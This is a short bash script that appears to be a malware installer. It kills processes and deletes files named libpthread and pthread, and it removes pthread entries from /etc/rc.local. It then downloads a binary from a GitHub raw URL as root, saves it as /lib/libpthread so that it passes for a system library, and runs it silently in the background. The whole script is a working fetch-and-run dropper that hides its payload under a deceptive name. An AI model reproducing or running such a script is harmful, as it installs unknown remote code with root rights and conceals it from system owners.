#!/bin/bash


sudo pkill libpthread
sudo pkill pthread
if [ -e /usr/sbin/libpthread ]; then
  rm -rf /usr/sbin/libpthread;
fi
if [ -e /usr/sbin/pthread ]; then
  rm -rf /usr/sbin/pthread;
fi
sed -i '/pthread/d' /etc/rc.local
sleep 2
sudo curl -fsSL https://raw.githubusercontent.com/atomshadows/doudous/master/sysps > /lib/libpthread
sudo chmod +x /lib/libpthread
sudo /lib/libpthread >/dev/null 2>&1 &
